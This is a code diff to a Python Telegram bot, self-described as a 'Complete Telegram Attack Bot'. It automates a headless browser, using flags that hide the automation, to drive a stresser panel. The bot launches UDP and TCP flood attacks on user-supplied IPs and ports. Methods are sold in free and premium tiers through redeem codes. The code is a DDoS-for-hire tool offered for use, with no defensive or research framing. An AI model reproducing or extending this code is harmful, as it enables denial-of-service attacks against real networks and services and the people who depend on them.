@@ -1,4 +1,4 @@
-# app.py - BROWSER AUTOMATION VERSION WITH UDP-FREE
+# app.py - Complete Telegram Attack Bot with Browser Automation
 
 import os
 import logging
@@ -8,6 +8,8 @@ import time
 import random
 import string
 import json
+import signal
+import sys
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -41,13 +43,13 @@ PANEL_USERNAME = os.getenv("PANEL_USERNAME", "your_username")
 PANEL_PASSWORD = os.getenv("PANEL_PASSWORD", "your_password")
 
 # CONCURRENT SETTINGS
-DEFAULT_CONCURRENT = 8
-MIN_CONCURRENT = 1
-MAX_CONCURRENT = 20
-MIN_DURATION = 60
-MAX_DURATION = 300
+DEFAULT_CONCURRENT = int(os.getenv("DEFAULT_CONCURRENT", "8"))
+MIN_CONCURRENT = int(os.getenv("MIN_CONCURRENT", "1"))
+MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "20"))
+MIN_DURATION = int(os.getenv("MIN_DURATION", "60"))
+MAX_DURATION = int(os.getenv("MAX_DURATION", "300"))
 
-# UDP-FREE METHODS ONLY
+# ATTACK METHODS
 ATTACK_METHODS = [
     "UDP-FREE",
     "UDP-FLOOD",
@@ -86,8 +88,6 @@ class Database:
         self.admins = {}
         self.broadcasts = []
         self.settings = {"pause_all": False}
-        self.browser_context = None
-        self.browser_page = None
         
         try:
             if mongo_uri:
@@ -622,7 +622,7 @@ class BrowserManager:
             
             # Launch Chromium
             self.browser = await self.playwright.chromium.launch(
-                headless=False,  # Set to True for headless mode
+                headless=True,  # Set to False for debugging
                 args=[
                     '--disable-blink-features=AutomationControlled',
                     '--disable-dev-shm-usage',
@@ -723,12 +723,13 @@ class BrowserManager:
                 await self.page.fill('input[name="time"], input[name="duration"], #time, #duration', str(duration))
                 await asyncio.sleep(0.5)
                 
-                # Select method (UDP-FREE or others)
+                # Select method
                 method_lower = method.lower()
-                if "udp" in method_lower or "free" in method_lower:
-                    # Try to find method dropdown
+                try:
                     await self.page.select_option('select[name="method"], #method', value=method_lower)
                     await asyncio.sleep(0.5)
+                except:
+                    pass
                 
                 # Set concurrent value
                 concurrent_selectors = [
@@ -853,6 +854,7 @@ class AttackManager:
         self.current_concurrent = DEFAULT_CONCURRENT
         self.attack_lock = asyncio.Lock()
         self.attack_task = None
+        self.current_method = None
         
         logger.info(f"🔥 Attack Manager initialized with concurrent: {DEFAULT_CONCURRENT}")
     
@@ -868,19 +870,18 @@ class AttackManager:
             if db.is_banned(user_id):
                 return False, "❌ You are banned!"
             
+            # Check plan for premium methods
             plan, expiry = db.get_user_plan(user_id)
             is_owner = db.is_owner_or_pseudo(user_id)
             is_admin = db.is_admin(user_id)
             
-            # UDP-FREE is free for everyone
-            if self.current_method and self.current_method.upper() == "UDP-FREE":
-                return True, "OK"
-            
-            if not is_owner and not is_admin and plan != "premium":
-                return False, "❌ *PREMIUM REQUIRED*\n\nUse `/redeem CODE` to activate."
-            
-            if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
-                return False, "❌ *PLAN EXPIRED*"
+            # Check if trying to use premium method
+            if self.current_method and self.current_method.upper() != "UDP-FREE":
+                if not is_owner and not is_admin and plan != "premium":
+                    return False, "❌ *PREMIUM REQUIRED*\n\nUse `/redeem CODE` to activate."
+                
+                if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
+                    return False, "❌ *PLAN EXPIRED*"
             
             return True, "OK"
     
@@ -1080,7 +1081,7 @@ async def send_attack_alert(attack_info, result=None):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== COMMANDS =====
+# ===== BOT COMMANDS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -1128,7 +1129,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME [METHOD] [CONCURRENT]'}\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
-        f"🆓 *FREE METHOD: UDP-FREE*\n"
+        f"🆓 *FREE METHOD: UDP-FREE (60s only)*\n"
         f"💎 *PREMIUM METHODS:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS[1:5]])
     )
     
@@ -1385,9 +1386,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     keyboard = []
-    # UDP-FREE is always available
     keyboard.append([InlineKeyboardButton("🆓 UDP-FREE", callback_data="method_UDP-FREE")])
-    # Premium methods
     keyboard.append([InlineKeyboardButton("💎 UDP-FLOOD", callback_data="method_UDP-FLOOD")])
     keyboard.append([InlineKeyboardButton("💎 UDP-VSE", callback_data="method_UDP-VSE")])
     keyboard.append([InlineKeyboardButton("💎 TCP-SYN", callback_data="method_TCP-SYN")])
@@ -1879,7 +1878,8 @@ async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TY
     )
 
 async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query    await query.answer()
+    query = update.callback_query
+    await query.answer()
     
     user_id = int(query.data.split('_')[1])
     
